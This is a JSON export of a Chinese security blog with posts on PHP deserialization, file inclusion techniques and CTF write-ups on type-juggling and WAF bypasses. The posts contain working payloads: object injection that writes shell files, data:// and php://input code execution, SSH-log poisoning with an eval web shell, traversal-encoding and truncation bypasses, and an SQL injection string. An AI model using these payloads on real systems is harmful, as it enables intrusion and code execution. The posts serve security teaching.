{"meta":{"title":"DD's Blog","subtitle":null,"description":null,"author":"DD","url":"https://ddstick.github.io","root":"/"},"pages":[],"posts":[{"title":"php反序列化漏洞","slug":"php反序列化漏洞","date":"2020-01-21T08:41:09.000Z","updated":"2020-01-28T05:48:04.523Z","comments":true,"path":"2020/01/21/php反序列化漏洞/","link":"","permalink":"https://ddstick.github.io/2020/01/21/php反序列化漏洞/","excerpt":"","text":"serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下： 1234567O为存储对象，如果给serialize()传入的是一个数组，那就是A1为对象名称有1个字符a为对象名称1表示有一个值s表示字符串，i则表示数字4表示字符串的长度test为字符串的名称 unserialize()与serizalize()对应的，unserialize()可以从已存储的表示中创建PHP的值，可以从序列化后的结果中恢复对象（object）。 反序列化漏洞利用构造函数等Magic functionphp中有一类特殊的方法叫“Magic function”： 123构造函数__constru(): 当对象创建（new）时会自动调用，但在unserialize()时是不会调用的。析构函数__destruct(): 当对象被销毁时会自动调用__wakeup(): unserialize()时会自动调用 测试如下： 1234567891011121314151617181920212223242526&lt;?phpclass a&#123; var $test = \"aaa\"; function __wakeup()&#123; echo \"__wakeup()函数已被调用\"; echo \"&lt;/br&gt;\"; &#125; function __construct()&#123; echo \"__construct()函数已被调用\"; echo \"&lt;/br&gt;\"; &#125; function __destruct()&#123; echo \"__destruct()函数已被调用\"; echo \"&lt;/br&gt;\"; &#125;&#125;$class1 = 'O:1:\"a\":1:&#123;s:4:\"test\";s:3:\"aaa\";&#125;';print_r($class1);echo \"&lt;/br&gt;\";$class1_unser = unserialize($class1);print_r($class1_unser);echo \"&lt;/br&gt;\";?&gt; 运行结果如下： 因为没有创建对象，所以构造函数construct()不会被调用，但是wakeup()跟__destruct()函数 wakeup()或destruct()的利用因为unserialize()后wakeup()或destruct()会直接调用，中间无需其他的过程。因此最好的情况就是一些漏洞/危害代码在wakeup()或destruct()中，从而当我们控制序列化字符串时可以直接取触发它们。如： 通过serialize()得到我们要的序列化字符串，之后再传进去。通过源代码得知，把对象test赋值为”“，再调用unserialize()时会通过__wakeup()把$test写入shell.php中。 1234567891011121314151617&lt;?phpclass a&#123; var $test = 'aaa'; function __wakeup()&#123; $fp = fopen(\"shell.php\",\"w\"); fwrite($fp, $this -&gt; test); fclose($fp); &#125;&#125;$class1 = new a();$class1 -&gt; test = \"&lt;?php phpinfo(); ?&gt;\";$class1_ser = serialize($class1);print_r($class1_ser);print(\"&lt;/br&gt;\");$class1_unser = unserialize($class1_ser);print_r($class1_unser);?&gt; 运行结果： shell.php文件 成功写入shell.php文件 但具体的环境多是下面代码这样，我们的test是我们可控的参数 12345678910111213141516&lt;?phpclass a&#123; var $test = 'aaa'; function __wakeup()&#123; $fp = fopen(\"shell.php\",\"w\"); fwrite($fp, $this -&gt; test); fclose($fp); &#125;&#125;$class1 = $_GET['test'];print_r($class1);echo \"&lt;/br&gt;\";$class1_unser = unserialize($class1);require \"shell.php\";//为显示效果，把这个shell.php包含进来?&gt; 利用上述代码生成参数O:1:”a”:1:{s:4:”test”;s:18:”“;} 传如参数得： 其他Magic function的利用有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，最后找到漏洞点。 12345678910111213141516171819202122&lt;?phpclass b&#123; function __construct($test)&#123; $fp = fopen(\"shell.php\",\"w\"); fwrite($fp, $test); fclose($fp); &#125;&#125;class a&#123; var $test = 'aaa'; function __wakeup()&#123; $obj = new a($this -&gt; test); &#125;&#125;$class1 = $_GET['test'];print_r($class1);echo \"&lt;/br&gt;\";$class1_unser = unserialize($class1);require \"shell.php\";?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 \\wakeup()函数，从而在new joker()会自动调用对象joker中的\\construct()方法，从而把写入到shell.php中： 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起 1234567891011121314151617181920212223242526&lt;?phpclass a&#123; var $test; function __construct()&#123; $this -&gt; test = new b(); &#125; function __destruct()&#123; $this -&gt; test -&gt; action(); &#125;&#125;class b&#123; function action()&#123; echo \"b\"; &#125;&#125;class c&#123; var $test2; function action()&#123; eval($this -&gt; test2); &#125;&#125;$class1 = new a();unserialize($_GET['test']);?&gt; 本意上，new一个新的a对象后，调用construct()，其中有new了一个b对象。结束后会调用destruct()，其中会调用action()，从而输出 b。 利用过程，构造序列化： 12345678910111213&lt;?phpclass a&#123; var $test; function __construct()&#123; $this -&gt; test = new c(); &#125;&#125;class c&#123; var $test2 = \"phpinfo();\";&#125;echo serialize(new a());?&gt; 得 1O:1:\"a\":1:&#123;s:4:\"test\";O:1:\"c\":1:&#123;s:5:\"test2\";s:10:\"phpinfo();\";&#125;&#125; 传给test.php，成功利用：","categories":[],"tags":[]},{"title":"PHP文件包含漏洞","slug":"文件包含漏洞","date":"2019-11-22T02:15:51.000Z","updated":"2019-12-03T04:50:26.475Z","comments":true,"path":"2019/11/22/文件包含漏洞/","link":"","permalink":"https://ddstick.github.io/2019/11/22/文件包含漏洞/","excerpt":"","text":"相关函数php中引发文件包含漏洞的通常是以下四个函数： 1234561.include()2.include_once()3.require()4.require_once()5.file_get_contents()6.readfile() 以上前4个函数的区别include() 如果出错的话，只会提出警告，会继续执行后续语句。reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。 include_once()、require_once()功能与上述两者几乎相同。不同的是如果一个文件已经被包含了，则不会被再次包含，以此避免函数重定义或者变量重新赋值等问题。 利用这四个函数所包含的文件都会被直接作为php文件进行解析。 test11234&lt;?php $file = $_GET['file']; include $file;?&gt; 若在同一目录下有文件info.txt，内容为 那么访问： 1xxxx?file=info.txt 即可成功解析phpinfo 分类LFI(Local File Inclusion)本地文件包含漏洞，即是指能打开并包含本地文件的漏洞。test1即为本地文件包含漏洞 RFI(Remote File Inclusion)远程文件包含漏洞，即是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI(Remote File Inclusion) 的利用需要条件，在php.ini中进行配置 121.allow_url_fopen = On2.allow_url_include = On 当两个配置均开启时，才能够远程包含文件成功 phpini中， allow_url_fopen = On 默认时一直为On，但 allow_url_include 从php5.2之后就默认为off 包含技巧下面例子中测试代码均为： 12345678include.php：&lt;?php $file = $_GET['file']; include $file;?&gt;info.txt：&lt;? phpinfo() ?&gt; allow_url_fopen 默认为 Onallow_url_include 默认为 Off 若有特殊要求，会在利用条件里指出 php伪协议php://input利用条件： 121.allow_url_include = On2.对allow_url_fopen不做要求 1234xxx/include.php?file=php://inputPOST:&lt;?php phpinfo(); ?&gt; php://filter这个是一个过滤器，里面的过滤方法很多，我们如果不想执行被包含的代码，我们就可以使用base64 编码输出，通常用来读取源码 php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定 1include.php?file=php://filter/read=convert.base64-encode/resource=flag.txt 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。index.php?file=php://filter/convert.base64-encode/resource=index.php效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用 1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 1234注意点：**(1)记住一旦使用了 read 选项，我们就值关心数据流的来源，这里的数据流的来源就是 resource 传入的，至于经过过滤器以后这个数据流要去哪里，这不是我们这个处理能决定的，还要依赖外部的函数****(2)一旦使用了 write 选项，我们就只关系数据的输出，数据的输出就是我们指定的 resource 的文件，而数据的输入要靠外部的函数帮我们实现****(3)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左** 过滤器(1)字符串过滤器 |:————:|:————-:||string.rot13|进行rot13转换||string.toupper|将字符全部大写||string.tolower|将字符全部小写||string.strip_tags|去除空字符、HTML 和 PHP 标记后的结果| (2)转换过滤器 |:————:|:————-:||convert.base64-encode|base64 编码||convert.base64-decode|base64 解码||convert.quoted-printable-encode|quoted-printable 编码（也是另一种将二进制进行编码的方案）||convert.quoted-printable-decode|quoted-printable 解码||convert.iconv|实现任意两种编码之间的转换| (3)压缩过滤器 |:————:|:————-:||zlib.deflate|压缩过滤器||zlib.inflate|解压过滤器||bzip2.compress|压缩过滤器||bzip2.decompress|解压过滤器| (4)加密过滤器 |:————:|:————-:||mcrypt.|加密过滤器||mdecrypt.|解密过滤器| 实例 1234readfile(“php://filter/resource=http://www.example.com\");readfile(“php://filter/read=string.toupper/resource=http://www.example.com\");readfile(“php://filter/read=string.toupper|string.rot13/resource=http://www.example.com\");file_put_contents(“php://filter/write=string.rot13/resource=example.txt”,”Hello World”); 特别提一下这个过滤器convert.iconv 这个过滤器能实现几乎任意的两种编码之间的转化 123php://filter/read=convert.iconv.UTF-8%2FASCII%2F%2FTRANSLIT/resource=...convert.iconv.ISO-8859-1/UTF-8php://filter/convert.iconv.UTF-8%2fUTF-7/resource= phar://利用条件：php版本大于等于php5.3.0 假设有个文件info.txt，其内容为，将其打包为zip压缩包 指定绝对路径 1include.php?file=phar://D:/software/phpstudy/PHPTutorial/WWW/test/info.zip/info.txt 或者使用相对路径（这里test.zip就在当前目录下） 1include.php?file=phar://info.zip/info.txt 使用phar://拓展php反序列化攻击面zip://利用条件：php版本大于等于php5.3.0 构造zip包的方法与phar相同 但使用zip协议，需要指定绝对路径，注意url编码,因为这个 # 会和url协议中的 # 冲突，将 # 编码为 %23 ，之后加上压缩包内的问件 1include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/test/info.zip%23info.txt data:URL schema数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； 和php伪协议的input类似 利用条件： 1.php版本大于等于php5.2 2.allow_url_fopen = On 3.allow_url_include = On data:text/plain输出直接显示在相应的URL中，显示参数：data:text/plain。然后你需要执行如下所示的php代码： 1include.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 执行命令： 1include.php?file=data:text/plain,&lt;?php system('whoami');?&gt; data:text/plain;base64有另一种方法来使用data: text/plain; base64，不过此时你需要使用base64编码来执行PHP代码，base64php代码如下所示： 1include.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 其中加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为： 包含session利用条件：session文件路径已知，且其中内容部分可控 php的session文件的保存路径可以在phpinfo的session.save_path看到 常见的php-session存放位置： 12341./var/lib/php/sess_PHPSESSID2./var/lib/php/sess_PHPSESSID3./tmp/sess_PHPSESSID4./tmp/sessions/sess_PHPSESSID session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码 包含日志访问日志利用条件：需要知道服务器日志的存储路径，且日志文件可读 开启日志 SSH log利用条件：需要知道ssh-logd位置，且可读。默认情况下为/var/log/auth.log 用ssh连接： 1ssh '&lt;?php @eval($_GET['dd']) ?&gt;'@remotehost 提示输入密码随便输入即可。 然后在remotehost的ssh-log中即可写入php代码 1include.php?file=/var/log/auth.log&amp;dd=ifconfig 包含environ利用条件： 1.php以cgi方式运行，这样environ才会保持UA头 2.environ文件存储位置已知，且environ文件刻度 proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 包含fd与包含environ类似 包含临时文件 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可 类似利用临时文件的存在，竞争时间去包含的，可以看：XMAN夏令营-2017-babyweb-writeup 绕过技巧平常碰到的情况肯定不会是简简单单的include $_GET[‘file’];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀： 1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file.'/test/test.php';?&gt; 这样就很“难”直接去包含前面提到的种种文件 指定前缀1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file;?&gt; 目录遍历./当前目录,../上一级目录,这样的遍历目录来读取文件 现在在/var/log/info.txt文件中有php代码 ，则利用../可以进行目录遍历： 1include.php?file=../../log/info.txt 则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。 一.利用url编码 1.**../** 1) %2e%2e%2f 2) ..%2f 3) %2e%2e/ 2.**..\\** 1) %2e%2e%5c 2) ..%5c 3) %2e%2e\\二.二次编码 1.**../** 1) %252e%252e%252f 2.**..\\** 1) %252e%252e%255c三.容器/服务器的编码方式 1.**../** 1) ..%c0%af 2) %c0%ae%c0%ae/ (java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点）) 2.**..\\** 1) ..%c1%9c指定后缀1234&lt;?php $file = $_GET['file']; include $file.'/test/test.php';?&gt; URLurl格式 123456789protocol :// hostname[:port] / path / [;parameters][?query]#fragment 1.protocol（协议）:指定使用的传输协议 2.hostname（主机名）:是指存放资源的服务器的域名系统（DNS）主机名或 IP 地址 3.:port（端口号） 4.path（路径） 5.;parameters（参数） 6.?query（查询） 7.fragment（信息片断） 在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制 query（?）1include?file=http://remoteaddr/remoteinfo.txt? 那么包含的文件就为http://remoteaddr/remoteinfo.txt?/test/test.php问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过的 fragment（#）1include.php?file=http://remoteaddr/remoteinfo.txt%23 那么包含的文件为http://remoteaddr/remoteinfo.txt#/test/test.php#后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。（注意：需要把#进行url编码为%23） 利用协议前面提到过利用zip协议和phar协议，现在假设测试代码为： 1234&lt;?php $file = $_GET['file']; include $file.'/test/test.php';?&gt; 构造个压缩包，包内的test.php的内容为： 1&lt;?php phpinfo(); ?&gt; 利用zip协议（注意要指定绝对路径） 1include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/test/chybeta.zip%23chybeta 那么拼接后则为：zip://D:/software/phpstudy/PHPTutorial/WWW/test/chybeta.zip#chybeta/test/test.php 长度截断利用条件：php版本 &lt; php 5.2.8 目录字符串，在Linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ 1include.php?file=././././........././././shell.txt 则后缀/test/test.php，在达到最大值后会被直接丢弃掉 0字节截断利用条件：php版本 &lt; php 5.3.4 1include.php?file=phpinfo.txt%00 防御手法1.无需情况下设置allow_url_include和allow_url_fopen为关闭 2.在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 3.做好文件的权限管理 4.对危险字符进行过滤等等 5.尽量不使用动态包含 6.本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log更多见上面的路径收集 利用/proc/self/environ进行包含包含session文件session文件一般在/tmp目录下，格式为sess_[phpsessid] 包含其他由php创建的tmp文件上传一个文件的过程,可以在tmp那里包含jpg向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。 jsp文件包含漏洞asp文件包含漏洞aspx文件包含漏洞","categories":[],"tags":[]},{"title":"Bugku-never-give-up","slug":"Bugku-never-give-up","date":"2019-11-09T07:54:45.000Z","updated":"2019-11-13T07:07:17.965Z","comments":true,"path":"2019/11/09/Bugku-never-give-up/","link":"","permalink":"https://ddstick.github.io/2019/11/09/Bugku-never-give-up/","excerpt":"","text":"无任何提示，于是查看源码 发现了个1p.html，打开后直接跳转到bugku主页想到可能是重定向跳转过去的于是利用 view-source:http://123.206.87.240:8006/test/1p.html 查看源码 由 var Words 中的值可知这为url编码解码后得 12&lt;script&gt;window.location.href='http://www.bugku.com'\\;\\&lt;/script\\&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--\\&gt; 发现是base64，将第一行去掉后解码： 1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E 再来一次url解码： 12345678910111213141516171819202122232425if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; 审计分析代码：12345678第 1 行：限制 URL 查询字符串中必须有非空非零变量 id第 9 行：限制变量 $a 中不能含有字符 .第 15 行：要满足以下 5 条表达式才会爆 flag： 变量 $data 弱等于字符串 bugku is a nice plateform! 变量 $id 弱等于整型数 0 变量 $b 的长度大于 5 字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配 变量 $b 的第一个字符弱不等于整型数 4","categories":[],"tags":[]},{"title":"strcmp与PHP处理0e开头md5时hash字符串漏洞","slug":"strcmp与PHP处理0e开头md5时hash字符串漏洞","date":"2019-11-09T00:29:28.000Z","updated":"2019-11-09T01:19:46.408Z","comments":true,"path":"2019/11/09/strcmp与PHP处理0e开头md5时hash字符串漏洞/","link":"","permalink":"https://ddstick.github.io/2019/11/09/strcmp与PHP处理0e开头md5时hash字符串漏洞/","excerpt":"","text":"123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 审计代码可知：我们需要以GET形式传递3个值，其中 v1 != v2 ，if中的第二个判断条件用的是 ==，我们可以利用 “0x” == “0a” 的判断结果为1，所以只找出经过加密后的两个md5值以0开头，接下去以都相同的值，直到遇到的字母的两个字符串相等 v3 == flag 一、PHP处理0e开头md5时hash字符串漏洞PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 例如：v1=s878926199a&amp;&amp;v2=s155964671a 二、md5函数特性根据md5函数特性，用两个值不同但不可进行md5的数据类型，如果使用一个不可md5的数据类型传入的话那么md5函数将返回false，这个也是返回值例如： v1[]=1&amp;&amp;v2[]=2 三、strcmp()12345int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。 1234567891011&lt;?php $password=\"***************\" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo \"Right!!!login success\";n exit(); &#125; else &#123; echo \"Wrong password..\"; &#125;?&gt; 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢我们只需将payload构造成 password[]=admin 即可 所以该题的绕过方式为： ?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3 ?v1=s878926199a&amp;&amp;v2=s155964671a&amp;&amp;v3[]=1 都可","categories":[],"tags":[]},{"title":"Bugku-字符正则","slug":"Bugku-字符正则","date":"2019-11-08T04:50:22.000Z","updated":"2019-11-08T13:36:42.684Z","comments":true,"path":"2019/11/08/Bugku-字符正则/","link":"","permalink":"https://ddstick.github.io/2019/11/08/Bugku-字符正则/","excerpt":"","text":"1234567&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125; 审计代码后知道只要我们构造出符合正则表达式的字符串通过GET传参传过去就可以看到 key 即 flag 123456789101112131415161718192021分析题目：定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；. （一个点）：表示匹配除 \"\\n\" 之外的任何单个字符；* ：匹配它前面的表达式0次或多次，等价于&#123;0,&#125;；&#123;n,m\\&#125; ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符\\\\ （反斜线）：后面的字符被转义；[a-z] ：在a到z中匹配 ；[[:punct:]] ：匹配任何标点符号；/i ：表示这个正则表达式对大小写不敏感；==========================================key . * key . &#123;4,7&#125; key:\\/ \\/ ( . * key ) [a-z] [[:punct:]]‘key’+任意单个字符+前面的字符重复零个或多个+‘key’+任意单个字符+长度4-7+‘key:/’+任意单个字符+ / +（任意单个字符+零个或多个+‘key’)+英文小写字母一个+匹配‘!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~.’中一个字符 分析完后便可以开始构造payloadkeyaaaakeya1234key:/a/aaaakeya! 正则表达式语法补充一、 “\\b” :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中”This is Regex”匹配单独的单词 “is” 正则就要写成 “\\bis\\b” \\b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界 “\\d”: 匹配数字 “\\w”：匹配字母，数字，下划线. “\\s”：匹配空格 “.”：匹配除了换行符以外的任何字符 “[abc]”: 字符组 匹配包含括号内元素的字符 另： “\\W” 匹配任意不是字母，数字，下划线 的字符 “\\S” 匹配任意不是空白符的字符 “\\D” 匹配任意非数字的字符 “\\B” 匹配不是单词开头或结束的位置 “[^abc]” 匹配除了abc以外的任意字符 二、 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。","categories":[],"tags":[]},{"title":"BUUCTF-web-EasyCalc","slug":"BUUCTF-web-EasyCalc","date":"2019-10-23T02:07:43.000Z","updated":"2019-12-14T11:45:49.859Z","comments":true,"path":"2019/10/23/BUUCTF-web-EasyCalc/","link":"","permalink":"https://ddstick.github.io/2019/10/23/BUUCTF-web-EasyCalc/","excerpt":"","text":"打开题目： 随便输入1，回显： 再尝试些敏感的关键词，回显： 看来是有waf，于是打开源码看看有唔提示： 123456789101112131415161718&lt;!--I've set up WAF to ensure security.--&gt;'&lt;script&gt; $('#calc').submit(function()&#123; $.ajax(&#123; url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()), type:'GET', success:function(data)&#123; $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(\"这啥?算不来!\"); &#125; &#125;) return false; &#125;)&lt;/script&gt; 源码中提示了这题加了waf，我们访问calc.php，看到源码如下: 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125;?&gt; 由这个waf我们得知payload中不能含有”‘ ‘, ‘\\t’, ‘\\r’, ‘\\n’,’&#39;‘, ‘“‘, ‘`‘, ‘[‘, ‘]‘,’$‘,’\\‘,’^‘“字符，除此之外，经过测试，这还过滤了字母，若num中含有字母则会返回403，所以除了上面这个waf、还有一个black_list 那么第一步要做的就是绕过他们其中一个最简单的办法就是直接在查询参数前面加个空格，即将?num=改为? num=即可绕过（在num前加个空格） 利用PHP的字符串解析特性绕过modsecurity转至：https://www.freebuf.com/articles/web/213359.html PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： 1/news.php?%20news[id%00=42\"+AND+1=0-- 上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中 